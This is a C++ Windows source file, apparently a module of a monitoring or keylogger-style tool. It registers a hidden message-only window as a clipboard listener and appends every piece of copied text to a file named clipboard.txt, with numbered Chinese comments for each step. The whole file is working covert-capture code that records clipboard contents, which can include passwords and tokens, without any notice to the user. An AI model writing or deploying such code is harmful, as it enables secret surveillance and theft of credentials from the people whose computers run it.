#include <windows.h>
#include <string>
#include "pch.h"
#include "utils.h"

LRESULT CALLBACK ClipboardViewerProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CLIPBOARDUPDATE:
		if (OpenClipboard(hwnd))
		{
			HANDLE hData = GetClipboardData(CF_TEXT);
			if (hData != NULL)
			{
				char* clipboardText = static_cast<char*>(GlobalLock(hData));
				if (clipboardText != NULL)
				{
					Log("clipboard.txt", "Clipboard changed: " + std::string(clipboardText) + "\n");
					GlobalUnlock(hData);
				}
			}
			CloseClipboard();
		}
		break;
	}
	return DefWindowProc(hwnd, message, wParam, lParam);
}

void ClipboardLogger()
{
	// step1. 註冊視窗類別
	WNDCLASSEX wc = { 0 };
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.lpfnWndProc = ClipboardViewerProc;
	wc.lpszClassName = L"ClipboardMonitor";
	RegisterClassEx(&wc);

	// step2. 創建隱藏視窗
	HWND hwnd = CreateWindow(L"ClipboardMonitor", NULL, 0, 0, 0, 0, 0,
		HWND_MESSAGE, NULL, NULL, NULL);

	// step3. 註冊剪貼簿監聽
	AddClipboardFormatListener(hwnd);

	// step4. 訊息迴圈
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}